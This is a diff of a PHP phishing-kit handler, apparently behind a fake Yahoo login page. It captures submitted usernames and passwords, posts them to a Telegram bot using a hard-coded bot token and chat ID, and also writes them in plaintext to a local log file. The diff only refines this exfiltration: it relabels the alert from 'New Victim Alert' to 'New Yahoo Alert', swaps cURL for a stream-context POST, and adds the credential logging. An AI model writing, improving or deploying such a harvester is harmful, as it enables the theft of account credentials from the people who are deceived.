@@ -1,28 +1,36 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Bot Token
-    $chat_id = "1559369377"; // Chat ID
+    $token = "7632866238:AAFJGMxkD8p18Z8wxnSvf5snHXJN8ZcK9BQ"; // Bot Token 🔑
+    $chat_id = "1559369377"; // Chat ID 🔑
 
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['password']);
 
-    $message = "🔥 New Victim Alert 🔥\n\n<b>Username:</b> $username\n<b>Password:</b> $password";
+    $message = "🔥 New Yahoo Alert 🔥\n\n<b>Username:</b> $username\n<b>Password:</b> $password";
 
-    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=".urlencode($message)."&parse_mode=HTML";
+    $url = "https://api.telegram.org/bot$token/sendMessage";
 
-    // Use cURL 💪
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $data = [
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML'
+    ];
 
-    $response = curl_exec($ch);
-    curl_close($ch);
+    $options = [
+        'http' => [
+            'method' => 'POST',
+            'header' => 'Content-Type: application/x-www-form-urlencoded',
+            'content' => http_build_query($data),
+            'ignore_errors' => true
+        ]
+    ];
 
-    // Debug Log 🔥
-    file_put_contents("log.txt", $response . "\n", FILE_APPEND);
+    $context = stream_context_create($options);
+    file_get_contents($url, false, $context);
 
-    header("Location: index.html"); // Redirect After Submission
+    file_put_contents("log.txt", "Username: $username | Password: $password\n", FILE_APPEND);
+
+    header("Location: index.html");
     exit();
 }
 ?>
